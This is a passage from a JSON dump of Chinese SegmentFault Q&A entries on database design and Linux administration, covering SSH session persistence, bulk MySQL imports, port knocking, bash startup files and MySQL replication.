      "title": "iOS客户端如何设计用于存储聊天记录的表？",
      "url": "https://segmentfault.com/q/1010000000247531"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000250546\">\n<ul>\n<li>用一个集合还是分成两个集合？</li>\n<li>如果用一个集合，收和支里包含的不同类型的数据怎么处理？</li>\n<li>如果分成两个集合，要显示收支明细，怎么查询？</li>\n</ul>\n</div>",
      "favourite": "1",
      "glance": "1.9k",
      "tags": [
        "mongodb",
        "数据库",
        "数据库设计"
      ],
      "time": "2013-07-04",
      "title": "mongodb 如何设计包含收支明细的数据库?",
      "url": "https://segmentfault.com/q/1010000000250546"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000253149\">\n<p>该服务器仅做数据分析使用，不对终端开放。可否考虑放在一个database里，分多个schema放置？</p>\n</div>",
      "favourite": "0",
      "glance": "2.4k",
      "tags": [
        "oracle",
        "数据库"
      ],
      "time": "2013-07-11",
      "title": "多个oracle数据库想合并放在一台服务器上，怎样设计较好？",
      "url": "https://segmentfault.com/q/1010000000253149"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000253420\">\n<p>如题，提示一下用什么方法就好了 </p>\n</div>",
      "favourite": "0",
      "glance": "1.3k",
      "tags": [
        "数据库"
      ],
      "time": "2013-07-12",
      "title": "oracle基于子查询获得了一个结果集（客户号），如何根据此客户号从另外两张表中获得数据，",
      "url": "https://segmentfault.com/q/1010000000253420"
    }
  ],

  "linux": [
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002451967\">\n<p><a href=\"http://jslinux.org/\" rel=\"nofollow\">http://jslinux.org/</a>  也是一个类似的网站 可以在线学习一些基础的shell</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002452134\">\n<p><a href=\"http://explainshell.com/\" rel=\"nofollow\">ExplainShell</a></p>\n<p>对于Linux用户来说每天都会写各种命令和脚本，那么可以使用这个网站工具来查看命令式如何工作的,这样可以避免不必要的错误出现；也是一个很好的学习命令的方式。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002452080\">\n<p><a href=\"http://www.shiyanlou.com/\" rel=\"nofollow\">http://www.shiyanlou.com/</a><br><a href=\"https://koding.com/\" rel=\"nofollow\">https://koding.com/</a></br></p>\n<p>不知道这个符合你的需求不，其实edx上的那个linux入门也挺不错。</p>\n</div>",
      "attention": "17",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002451945\">\n<p>从小到大都是用 Windows 的，不太熟悉 Linux 的命令行模式。之前用 Linux 都感觉用得没有 Windows 那么顺手（Linux 新手，勿喷），于是不喜欢用 Linux 。</p>\n<p>昨晚玩了一下 Docker 的 tutorial 之后发现原来命令行也挺好玩的，于是现在想认真地学 Linux。</p>\n<hr>\n<h3>好，重点来了</h3>\n<p>想让一下大家分享一下<strong>类似于 <a href=\"https://www.docker.com/tryit/\" rel=\"nofollow\">Docker Tutorial</a> 、 <a href=\"https://try.github.io/levels/1/challenges/1\" rel=\"nofollow\">Try Git</a> 以及 <a href=\"http://www.openvim.com/tutorial.html\" rel=\"nofollow\">Vim Tutorial</a> 等等这类网站</strong>。我知道的只有这三个，最近想找个学习 Linux 命令的，可是还没找到 T^T<br>\n个人感觉这种可以在玩中学的 Tutorial 挺适合新手学习用的。</br></p>\n<hr>\n<p>我会将大家分享的网址收集起来然后弄到 GitHub 上面去（或者可以的话弄个集成各种 Tutorial 的网页，哈哈）</p>\n<hr>\n<p>2014/12/30 16:32 更新</p>\n<p><strong>不是找 MOOC ，而是找辅助练习的模拟终端（带有提示功能）</strong></p>\n</hr></hr></hr></div>",
      "favourite": "3",
      "glance": "2k",
      "tags": [
        "linux",
        "模拟终端"
      ],
      "time": "2014-12-29",
      "title": "给新手推荐一些在线学习命令行的网站（tutorial）",
      "url": "https://segmentfault.com/q/1010000002451945"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000136154\">\n<p>lz需要的是tmux或者screen</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000136031\">\n<p>试一下nohup</p><pre>nohup - run a command immune to hangups, with output to a non-tty</pre><p><a href=\"http://www.21andy.com/blog/20071121/677.html\" rel=\"nofollow\" target=\"_blank\" title=\"http://www.21andy.com/blog/20071121/6...\">http://www.21andy.com/blog/20071121/6...</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000136342\">\n<p>准备运行<br/>\nnohup xxx &amp;</p><p>如果已经运行了<br/>\nctrl+z 暂停<br/>\njobs 看到暂停任务的id<br/>\nbg id<br/>\ndisown id #注：不加这句的话，终端结束时进程会收到SIGHUP，该信号对应的默认操作就是结束进程</p><p>除了nohup之外也可以用setsid，但是最好的还是用screen这类东西。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000136025\">\n<p>我经常有这样的需求，通过ssh连接到服务器上，运行一个脚本。<br/>\n因为脚本要运行很久，所以就丢在那里，看着打印输出。<br/>\n一会儿不管他，电脑就进入休眠了，网络也就断了，ssh就断了，服务器运行的进程也挂了。<br/>\n有没有什么办法，可以让这种情况下进程不死，然后再次练上去还可以继续看脚本运行的打印</p>\n</div>",
      "favourite": "4",
      "glance": "5.6k",
      "tags": [
        "linux",
        "ssh"
      ],
      "time": "2012-11-06",
      "title": "ssh连接断开后怎么保证进程不死",
      "url": "https://segmentfault.com/q/1010000000136025"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000309586\">\n<p>按一千万行的数据来计算，假设你对 PHP 最熟悉，开发速度最快，假设你要写入到 MySQL 中。</p>\n<ol>\n<li><p>用 shell 将一千万行文件切分成 100 个文件,这样每个文件有10万行,具体做法可以 man split。</p></li>\n<li><p>写 php 脚本,脚本内容是读一个文件,然后输出有效的数据。注意数据格式，严格按照表中字段的顺序来写，字段之间用半角分号隔开，行之间用 \\n 隔开。具体参数可配置，参见 MySQL 的 load data 命令参数。注意是 php cli 方式运行的，不要拿 Apache 或者 其他 web server 下面跑这个东西。如果按行读不知道怎么搞可以直接用 php 的 file() 函数，生成的 sql 语句通过 error_log($sql, 3, \"/path/to/dataa\") 函数写入到文件中。同时可以 echo 一些调试信息，以备后续检查。</p></li>\n<li><p>写 shell 脚本调用 php 处理日志.脚本可以类似来写</p>\n<p>/path/to/php/bin/php -f genMySQLdata.php source=loga out=dataa &gt; /errora.log &amp;\n/path/to/php/bin/php -f genMySQLdata.php source=logb out=datab &gt; /errorb.log &amp;\n/path/to/php/bin/php -f genMySQLdata.php source=logc out=datac &gt; /errorc.log &amp;\n....重复一百行，机器配置低可以分批写，每个写 10 行也行。这个脚本内容很有规律吧，本身也可以用 php 来生成。时间又省了。\n在机器上执行这个 shell 脚本，实际上就启动多个 PHP 进程来生成数据。配置够牛的话，就等于你启动了 100 个 PHP 进程来处理数据。速度又快了。</p></li>\n<li><p>继续写 shell 脚本，内容是打开 MySQL 用 load data 来载入数据。</p>\n<p>mysql -h127.0.0.1 -uUser -ppwd -P3306 -D dbname -e 'load data infile \"/path/to/dataa\" into table TableName(Field1, Field1, Field1);'\n其中的 field1 ... 要跟生成数据的顺序对应，这个命令可以直接执行，也可以放到 shell 里面重复写 N 行,然后执行 shell 脚本。</p></li>\n</ol>\n<p>PS：注意编码</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000310032\">\n<p>如果是一次性把这100万数据导入mysql就完事了，用mysql的load data就可以搞的，我用load data 导入以前csdn泄漏的帐号密码650万左右的数据也就2分钟多点。。。<br/>\n如果是多次复用程序，想做成脚本，可以每次读取10万个，foreach外面显式开启事务（ps:循环插入必须显式开启事务，性能比较好，一次性写入后，再统一commit，10万条速度提升最起码百倍甚至千倍，磁盘io也低），变量用完记得unset，插入100万数据那是小case。<br/>\n也可以用insert into values(1,2),(2,3)...拼接的方式，性能最快。不过注意sql语句长度有限制，可以一次性插入1000条。\n不显式开启事务，foreach里insert是最垃圾的做法，最慢，io压力也最大，因为每次insert，都有一次昂贵的系统调用fsync(). 循环100万次相当于调用100万次fsync. 显示开启事务，每10万次一次commit调用一次fsync，100万次只调用10次fsync。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000309285\">\n<p>百万条…不算大数字啊…</p>\n<p>数据处理的瓶颈基本在IO，你可以直接单线程读写（特别是你还要做数据库插入，随便添加个index你的插入就成为瓶颈了）。</p>\n<p>但是你为什么要存入数组啊同学！你准备把文件内容全部塞进内存吗啊？读一条，判断一次，OK就存数据库不OK就丢掉，就这么简单，存什么数组…</p>\n<p>还有你真的准备用PHP做数据处理吗…</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000309273\">\n<p>在一个文本文件里存了一百万条数据，一行一条，</p>\n<p>我需要把符合条件的每一行数据写入到数据库里，</p>\n<p>按照以前的做法就是读取文件里的数据，然后存入数组，然后foreach数组进行一条一条的处理（符合条件的写入到数据库），</p>\n<p>但是面对上百万条数据，如果我再继续这样做看来是自寻死路，可是处理大数据真是大姑娘我坐花轿可是头一回，一点经验也没有，</p>\n<p>从网上找资料说用php进程/线程来解决，我对进程与线程是一头污水，请大牛们进来分享一下这方面的经验，是怎么处理大数据的，如果通过进程/线程又是怎么实现的呢？</p>\n</div>",
      "favourite": "20",
      "glance": "8.3k",
      "tags": [
        "php",
        "mysql",
        "linux",
        "nginx",
        "apache"
      ],
      "time": "2013-09-18",
      "title": "如何处理百万条数据写入到数据库",
      "url": "https://segmentfault.com/q/1010000000309273"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002679833\">\n<ol>\n<li>SSH</li>\n<li>VNC</li>\n<li>web shell (做好控制)（不是说的php被人插入的webshell）</li>\n<li><del>telnet</del></li>\n<li>puppet之类的集中管理工具</li>\n<li>私钥。</li>\n<li>没事没人动.ssh的权限。</li>\n</ol>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002679993\">\n<p>Do not give sudo privilege to anyone you do not trust.</p>\n<p>如果你的场景是需要别人来维护服务器上的某些文件的配置,分为两种情况</p>\n<p>该文件本身属于root, 新建一个group并将file的owner改为该group并设置g+wr, 为别人创建一个属于该group的用户</p>\n<p>该文件本身属于某个group, 为别人创建一个属于该group的用户</p>\n<p>这样别人可以有权限来维护某些文件, 但是不能去更改你的home下的任何文件.</p>\n<p>强烈反对共用一个ssh user</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002680264\">\n<p>恩，找到了，这是我想要的：<a href=\"http://www.ibm.com/developerworks/cn/aix/library/au-sshlocks/\" rel=\"nofollow\">端口碰撞技术</a></p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002679499\">\n<p><strong>提前声明：</strong>不考虑iptables和hosts.allow</p>\n<p>我的ssh设定<strong>只能密钥登陆</strong>，<strong>只能 admin 用户登陆</strong>。<br>\n现在有人无意间(?)修改了 /home/admin/.ssh 目录的权限，导致我不能登陆服务器，把自己关在了外面</br></p>\n<p>在网上搜了一下，发现基本上都是设定cron任务，定时检查修改某些配置来防止这种情况。</p>\n<p>但我不想使用这种方法，记得有一种方法好像是<strong><code>向服务器发送某些特定序列的数据包</code></strong>，即可达到目的，不知道哪位高手能解答一下。<br>\n谢谢！</br></p>\n</div>",
      "favourite": "4",
      "glance": "1.3k",
      "tags": [
        "linux",
        "ssh",
        "安全"
      ],
      "time": "2015-04-16",
      "title": "如何防止Linux下SSH把自己关在外面？",
      "url": "https://segmentfault.com/q/1010000002679499"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000133323\">\n<p>其实这个问题的核心就是 Shell 初始化时读取配置文件的步骤，而 Shell 又可以分为两类：Login Shell 和 Non-login Shell。参考博客 <a href=\"http://www.thegeekstuff.com/2008/10/execution-sequence-for-bash_profile-bashrc-bash_login-profile-and-bash_logout/\" rel=\"nofollow\" target=\"_blank\" title=\"Execution sequence for .bash_profile,...\">Execution sequence for .bash_profile,...</a>：</p><p>1. <strong>Login Shell</strong> 初始化时配置文件读取顺序的伪代码示意：</p><pre>execute /etc/profile\n\nIF ~/.bash_profile exists THEN\n    execute ~/.bash_profile\nELSE\n    IF ~/.bash_login exist THEN\n        execute ~/.bash_login\n    ELSE\n        IF ~/.profile exist THEN\n            execute ~/.profile\n        END IF\n    END IF\nEND IF</pre><p>2. <strong>Non-Login Shell</strong> 初始化时配置文件读取顺序的伪代码示意：</p><pre>execute /etc/bash.bashrc\nIF ~/.bashrc exists THEN\n    execute ~/.bashrc\nEND IF</pre><p>最后，Mac 的终端默认开启为 Login Shell。而 Ubuntu 的 Gnome Terminal 默认开启的是 Non-Login Shell.</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000133391\">\n<p>原文见 <a href=\"https://gist.github.com/1564928\" rel=\"nofollow\" target=\"_blank\" title=\"https://gist.github.com/1564928\">https://gist.github.com/1564928</a></p><h4>Shell的不同分类</h4><p>根据启动Bash Shell的方式不同，对Shell有两种分类方式</p><p>=</p><h4>登录Shell与非登录Shell</h4><p>=</p><p>根据Shell的启动方式不同，可以将Shell分为</p><p>1. Login Shell<br/>\n2. Non-login Shell</p><p>Login Shell的定义是，当前shell的<code>argv[0]</code>的第一个字符是<code>-</code>，或当前shell使用了<code>-l</code> ( <code>--login</code> ) 选项。</p><p>只要满足以上的两个条件的任意一个，bash就会表现得Login Shell一样。例如，以下列出的场景下，bash都是login shell：</p><p>1. 执行<code>bash -l -c 'w'</code> ( 使用了-l选项 )<br/>\n2. 执行<code>su -l admin</code> ( 运行的Shell的<code>argv[0]</code>第一个字符是<code>-</code> )<br/>\n3. 执行<code>login -f</code> ( 运行的Shell的<code>argv[0]</code>第一个字符是<code>-</code> )<br/>\n4. 将当前目录加入到<code>$PATH</code>，根据以下命令创建到bash的链接并执行 ( 运行的Shell的<code>argv[0]</code>第一个字符是<code>-</code> )</p><pre>export PATH=\".:$PATH\"\nln -s -- $(which bash) -bash   \n-bash</pre><p>=</p><h4>交互与非交互Shell</h4><p>=</p><p>同时，根据Shell启动参数的不同，还可以将Shell分为</p><p>1. Interactive Shell<br/>\n2. Non-interactive Shell</p><p>Interactive Shell的定义很明确：<code>$-</code>环境变量中包含字符<code>i</code>的Shell就是Interactive Shell</p><p>以下场景中，bash属于Interactive Shell</p><p>1. bash执行时没有加上非选项参数 [^noa]<br/>\n2. bash执行时没有加上<code>-c</code>选项<br/>\n3. bash执行时，加上了<code>-i</code>选项</p><p>以下场景中，bash属于Non-interactive Shell</p><p>1. 使用<code>rsync -e ssh</code>同步文件（<code>-c</code>选项）<br/>\n2. 其他基于ssh的文件传输，如git、svn等（基本都启用了<code>-c</code>选项）</p><h4>不同Shell中启动时执行的文件</h4><p>Bash启动时会按照一定的顺序载入rc文件，定义<code>PS1</code>、<code>JAVA_HOME</code>等环境变量，执行特定的脚本等。</p><p>按照两种Shell分类排列组合，一共有4种组合。各个组合下启动载入rc文件的顺序和数量有区别，以下分别列出：</p><p>=</p><h4>登录/非交互Shell &amp; 登录/交互Shell</h4><p>=</p><p>bash会依次执行以下文件</p><p>1. <code>/etc/profile</code> <code>[^sysconfdir]</code><br/>\n2. <code>~/.bash_profile</code><br/>\n3. <code>~/.bash_login</code><br/>\n4. <code>~/.profile</code></p><p>=</p><h4>非登录/非交互Shell</h4><p>=</p><p>执行<code>$BASH_ENV</code>环境变量中指定的脚本</p><p>=</p><h4>非登录/交互Shell</h4><p>=</p><p>1. “全局”bashrc（编译时定义<code>SYS_BASHRC</code>，默认为<code>/etc/bash.bashrc</code>）<br/>\n2. <code>~/.bashrc</code> [^exception_bashrc]</p><h4>SSH远程登录服务器执行命令场景分析</h4><p>上面在分析交互/非交互、登录/非登录Shell的时候，特地省略了ssh到远程服务器执行命令这种场景下Shell类型的分类，放在这里分析。</p><p>相关的资料不是很多，不管是<code>bash(1)</code>还是<code>ssh(1)</code>还是<code>sshd(1)</code>，都没有对这个场景详细说明过。经过多次尝试，在不同的rc文件里echo特定字符串，得出结论。如果分析有问题，请大家纠正。</p><p>使用的命令为<code>ssh 127.0.0.1 w</code>进行分析，会发现这个命令执行时会载入<code>~/.bashrc</code>，不会载入<code>/etc/profile</code>等文件</p><p>在<code>~/.bashrc</code>文件中放置命令<code>ps -p $$ -o args=</code>，可获得载入<code>~/.bashrc</code>文件的进程命令行为<code>bash -c w</code>，是一个非登录、非交互Shell。根据<code>bash(1)</code>中<code>INVOCATION</code>段的说明，此时应该只载入<code>$BASH_ENV</code>环境变量的脚本，不会载入<code>/etc/bash.bashrc</code>或<code>~/.bashrc</code>脚本</p><p>进一步研究OpenSSH源码和Bash源码。OpenSSH中执行shell部分的代码如下：</p><pre>// from session.c of OpenSSH 5.9p1 \n/*\n * Execute the command using the users shell.  This uses the -c\n * option to execute the command.  \n */\nargv[0] = (char *) shell0;\nargv[1] = \"-c\";\nargv[2] = (char *) command;\nargv[3] = NULL;\nexecve(shell, argv, env);\nperror(shell);\nexit(1);</pre><p>而Bash中的相关代码：</p><pre>// from config-top.h\n\n/* Define this if you want bash to try to check whether it's being run by\n   sshd and source the .bashrc if so (like the rshd behavior). */\n/* #define SSH_SOURCE_BASHRC */\n\n// from shell.c of Bash 4.2\n\n#ifdef SSH_SOURCE_BASHRC\n      run_by_ssh = (find_variable (\"SSH_CLIENT\") != (SHELL_VAR *)0) ||\n                   (find_variable (\"SSH2_CLIENT\") != (SHELL_VAR *)0);\n#else\n\n/* ... */\n\n/* If we were run by sshd or we think we were run by rshd, execute\n~/.bashrc if we are a top-level shell. */\nif ((run_by_ssh || isnetconn (fileno (stdin))) &amp;&amp; shell_level &lt; 2)\n{\n#ifdef SYS_BASHRC\n#  if defined (__OPENNT)\n    maybe_execute_file (_prefixInstallPath(SYS_BASHRC, NULL, 0), 1);\n#  else\n    maybe_execute_file (SYS_BASHRC, 1);\n#  endif\n#endif\n    maybe_execute_file (bashrc_file, 1);\n    return;\n}</pre><p>可以看到，只要编译前在<code>config-top.h</code>中定义<code>SSH_SOURCE_BASHRC</code>，那么尽管Bash在被sshd fork出来的时候加上了<code>-c</code>选项，也确实是non-login non-interactive shell，只要发现<code>SSH_CLIENT</code>或者<code>SSH2_CLIENT</code>环境变量存在，就仍然会依次载入<code>SYS_BASHRC</code>、<code>~/.bashrc</code>文件。</p><p>这个结论非常重要，因为包括svn、git、rsync在内很多命令都使用ssh作为传输层。如果<code>/etc/bash.bashrc</code>、<code>~/.bashrc</code>文件配置不合理，这些命令的执行都会有问题。</p><p>请注意，在此问题上，各发行版自带bash的行为可能不同。Debian 5和6的补丁都设置了<code>SSH_SOURCE_BASHRC</code>，用户自己编译时可能未设定，因此也不能简单地认为通过ssh执行命令时服务器上的bash一定载入bashrc系列文件，更不可依赖bashrc来执行初始化命令。</p><h4>常见问题分析</h4><p>=</p><h4>Banner、Motd类提示信息应该放在哪里？</h4><p>=</p><p>某些服务器可以在用户登录时加入一些提示信息，提示用户操作等。这样的信息仅需要在用户登录时显示，因此可以将此类信息放在login shell才会载入的文件中，如<code>/etc/profile</code>、<code>~/.bash_profile</code>、<code>~/.bash_login</code>、<code>~/.profile</code></p><p>是否能将此类提示信息放在<code>~/.bashrc</code>文件内呢？下面说明</p><p>=</p><h4>在<code>~/.bashrc</code>文件是否能<code>source ~/.bash_profile</code>呢？</h4><p>=</p><p>以前遇到过一个问题。跳板机上在<code>~/.bashrc</code>里显示了一些banner信息，导致诡异地无法从其他服务器<code>rsync</code>文件到这台跳板机上。</p><p>从<code>rsync(1)</code>的<code>DIAGNOSTICS</code>部分可以看到，<code>rsync</code>非常依赖于shell执行时没有任何输出。如果在<code>~/.bashrc</code>中source了<code>~/.bash_profile</code>，而<code>~/.bash_profile</code>中又有无关的文字输出，就会导致从其他服务器rsync到此服务器失败，报错信息为\"protocol version mismatch — is your shell clean?\"。这也回答了上一节的问题：*banner类信息不能放在<code>~/.bashrc</code>文件内*</p><p>但是反过来，在<code>~/.bash_profile</code>中<code>source ~/.bashrc</code>是可以的，但是使用时要非常小心（容易引起循环引用，导致问题）</p><p>=</p><h4>ssh到服务器执行<code>java -version</code>为什么版本和实际应用使用的不一致？</h4><p>=</p><p>目前<code>JAVA_HOME</code>、<code>PATH</code>等环境变量的定义是在<code>/etc/profile</code>。ASA比较常见的操作是脚本跑一个集群，ssh到相应服务器上确认java版本是否正确。这个时候shell只会载入<code>~/.bashrc</code>，不会载入<code>/etc/profile</code>。</p><p>解决方法可以用以下任一：</p><ol><li>先<code>source /etc/profile</code>再执行<code>java -version</code>来判断</li><li>执行 <code>ssh remote-host 'bash -l -c \"java -version\"'</code></li></ol><p>[^noa]: Non-option Arguments，即不以<code>-</code>开头的参数。例如，<code>bash -l test.sh</code>，<code>-l</code>是option argument，<code>test.sh</code>是non-option argument<br/>\n<code>[^sysconfdir]</code>: 严格地说，是<code>${SYSCONFDIR}/profile</code>文件。<code>${SYSCONFDIR}</code>是程序编译时，传递给<code>configure</code>脚本的<code>--sysconfdir</code>选项指定的目录。编译时没有指定<code>--sysconfdir</code>则使用<code>--prefix</code>指定的路径下<code>etc</code>文件夹。默认<code>${SYSCONFDIR}</code>为<code>/</code><br/>\n[^exception_bashrc]: 存在例外情况。如果编译bash时加上了<code>#define SYS_BASHRC /etc/bashrc</code>或<code>CPPFLAGS</code>加上了<code>-DSYS_BASHRC=/etc/bashrc</code>，那么任何时候<code>~/.bashrc</code>被载入前，<code>${SYS_BASHRC}</code>文件先被载入</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000133221\">\n<p>几个bash配置文件的说明:</p><blockquote>/etc/profile:此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行.并从/etc/profile.d目录的配置文件中搜集shell的设置.</blockquote><blockquote>/etc/bashrc:为每一个运行bash shell的用户执行此文件.当bash shell被打开时,该文件被读取.</blockquote><blockquote>~/.bash_profile:每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量,执行用户的.bashrc文件.</blockquote><blockquote>~/.bashrc:该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该该文件被读取.</blockquote><blockquote>~/.bash_logout:当每次退出系统(退出bash shell)时,执行该文件.</blockquote><p>另外,/etc/profile中设定的变量(全局)的可以作用于任何用户,而~/.bashrc等中设定的变量(局部)只能继承/etc/profile中的变量,他们是\"父子\"关系.</p>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000133177\">\n<p>以前公司的Linux貌似写.bash_profile是不管用的，所以一些alias和PS1都是写在bashrc里<br/>\n现在自己的电脑反过来了，bashrc不管用，要写bash_profile<br/>\n这两个文件到底有什么区别？是不是有哪里可以配置，让用户登陆的时候去加载某个文件的？</p>\n</div>",
      "favourite": "9",
      "glance": "9k",
      "tags": [
        "linux",
        "shell"
      ],
      "time": "2012-10-29",
      "title": ".bash_profile .bash_rc 什么区别",
      "url": "https://segmentfault.com/q/1010000000133177"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000304615\">\n<p>可以参考一下这个讨论：<br/>\n<a href=\"http://www.itpub.net/thread-1184103-1-1.html\" rel=\"nofollow\">http://www.itpub.net/thread-1184103-1-1.html</a></p>\n<p>主要是这几点：</p>\n<ol>\n<li>增加冗余  </li>\n<li>增加了机器的处理能力（硬件资源增加了）</li>\n<li>对于读操作为主的应用，使用读写分离是最好的场景.....因为可以确保写的服务器压力更小....而读又可以接受点时间上的延迟</li>\n</ol>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000305151\">\n<p>我所知道的两个方面：</p>\n<ol>\n<li>我们可以在从库启动是增加一些参数来提高其读的性能，例如--skip-innodb、--skip-bdb、--low-priority-updates以及--delay-key-write=ALL。当然这些设置也是需要根据具体业务需求来定得，不一定能用上。</li>\n<li>分摊读取。假如我们有1主3从，不考虑上述1中提到的从库单方面设置，假设现在1分钟内有10条写入，150条读取。那么，1主3从相当于共计40条写入，而读取总数没变，因此平均下来每台服务器承担了10条写入和50条读取（主库不承担读取操作）。因此，虽然写入没变，但是读取大大分摊了，提高了系统性能。另外，当读取被分摊后，又间接提高了写入的性能。所以，总体性能提高了，说白了就是拿机器和带宽换性能。MySQL官方文档中有相关演算公式：<a href=\"http://dev.mysql.com/doc/refman/5.1/zh/replication.html#replication-faq\" rel=\"nofollow\">官方文档</a> 见6.9FAQ之”MySQL复制能够何时和多大程度提高系统性能“</li>\n</ol>\n<p>补充，MySQL复制另外一大功能是增加冗余，提高可用性，当一台数据库服务器挂了后能通过调整另外一台从库来以最快的速度恢复服务，因此不能光看性能，也就是说1主1从也是可以的。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000305266\">\n<p>1.物理服务器增加，负荷增加<br/>\n2.主从只负责各自的写和读，极大程度的缓解X锁和S锁争用<br/>\n3.从库可配置myisam引擎，提升查询性能以及节约系统开销<br/>\n4.至于你提到的“master所执行的（写）的所有语句，都会在slave被执行一遍”这个只说对一半，从库同步主库的数据和主库直接写还是有区别的，通过主库发送来的binlog恢复数据，但是，最重要区别在于主库向从库发送binlog是异步的，从库恢复数据也是异步的。<br/>\n5.读写分离适用与读远大于写的场景，如果只有一台服务器，当select很多时，update和delete会被这些select访问中的数据堵塞，等待select结束，并发性能不高。 对于写和读比例相近的应用，应该部署双主相互复制。</p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000304576\">\n<p>我看了一些文章，使用master/slave模式实现读写分离以提高mysql性能</p>\n<p>实现方式是web server向master写，master与slave同步，然后web server从slave上读</p>\n<p>我不明白这种方式为什么会提高性能？因为master需要与slave同步，这意味着在master所执行的（写）的所有语句，都会在slave被执行一遍，这不是等于slave与master的负荷与读的效率是一致的吗？</p>\n<p>是读写方式的实现方式我理解错了，还是有我没有搞懂的地方？请赐教，谢谢！</p>\n</div>",
      "favourite": "15",
      "glance": "9.8k",
      "tags": [
        "mysql",
        "php",
        "linux",
        "mysql_replication"
      ],
      "time": "2013-09-07",
      "title": "MySQL master/slave 模式的读写分离为什么会提高性能？",
      "url": "https://segmentfault.com/q/1010000000304576"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000391412\">\n<p>首先。。。。等。。。。一。。。。会。。。。儿。。。。你当PHP做后端的本事是吃素的不成。。。。</p>\n<p>然后。。。。再。。。。等。。。。一。。。。会。。。。儿。。。。Python效率高。。。。嗯好吧，开发效率高。。。。（撞墙）</p>\n<h3>语言的考虑</h3>\n<p>PHP和Python都有悠久的历史，都有庞大的内置工具库(Python尤其猛)，都有相当完善的文档系统。可以说PHP和Python在很大程度上都表现了“小脚本撬动大需求”的共性。</p>\n<p>所以简单的一个考虑就是：深入谁都差不多。。。完全可以比对着学习的。。。犹豫这个是件没道理的事情。</p>\n<h3>其他技术的考虑</h3>\n<p>但语言虽然很大程度上一致，但语言都不只是语言自己。以Web开发为例：HTML/CSS/JS、SQL、正则、JSON/XML……这些外围知识，PHP和Python都自带，但都不是语言本身所完全覆盖的。</p>\n<p>其实无论招聘什么工程师，都隐含的假设了：除了语言之外，程序员为实现业务目标，也了解必要的外围知识。</p>\n<p>所以千万不要把语言本身孤立的，或者是割裂开来看。</p>\n<h3>技术无关的考虑</h3>\n<p>虽然语言选择无所谓，但是题主这个方法导向的选择恐怕不是好事。</p>\n<p>简单的来说，程序员是为了实现目标而使用语言，而不是为了使用语言而使用语言。“我一定要专学Python，什么都用Python”一类的论调，简而言之就是生搬硬套。</p>\n<p>所以选择语言，不如选择目标。按照自己想承担的开发工作，需要什么学什么，并且一定要快速学习、快速迭代、快速更新。在这个开源运动风行世界的年代，一招鲜吃遍天的事情，一般是荒谬的。因为等闭关学透了，出来一看，江湖早就变了。</p>\n<p>别想着怎样“完美的”开一个好头，也别想着一开始就为自己制定一个“完全”的计划。做梦去吧。不断学习，不断迭代，不断的发现以前期待的事情其实没有价值，不断发现以前忽略的事情其实很有用处，这才是人类的营生之道。变者生，不变者死，不要把自己锁死在某个特定的事物之上。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000391388\">\n<p>前后端都可以做？？？Python做前端？<br>\n既然喜欢Python就用Python呗，天朝内用Python的企业又不是没有，比如豆瓣。<br>\n最后给你看看国内那些公司在用Python，也许你就不会这么纠结了：<a href=\"http://www.zhihu.com/question/19555512\" rel=\"nofollow\">http://www.zhihu.com/question/19555512</a></br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000396408\">\n<p>很多语言初学者都会问\"我该学什么语言好，什么语言好找工作?\"。我觉得这个问题本身就是有误区，一门编程语言的产生是因为它能够比其他语言更方便的解决某个或某类型的问题。所以我觉得你首先应该考虑的是自己喜欢做什么？喜欢从事什么样的工作？然后选择学习某门语言，带着问题学习总是比为了学习语言而学习更有效率，而不是盲目的选择某门语言。例如，如果你对前端很感兴趣，那么你需要深入学习的可能是JavaScript，而不是深挖C。</p>\n</div>",
      "attention": "9",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000391380\">\n<p>大神门， 我正在纠结深入php 还是python， 都会一点点， 个人比较喜欢python，前后端都可以做，而且效率搞，语法吸引人。  但是php好像比较好找工作，百度，新浪，XXX 都是PHP比较多，  肿么办呢？ 救救我吧，谢谢了</p>\n</div>",
      "favourite": "9",
      "glance": "31k",
      "tags": [
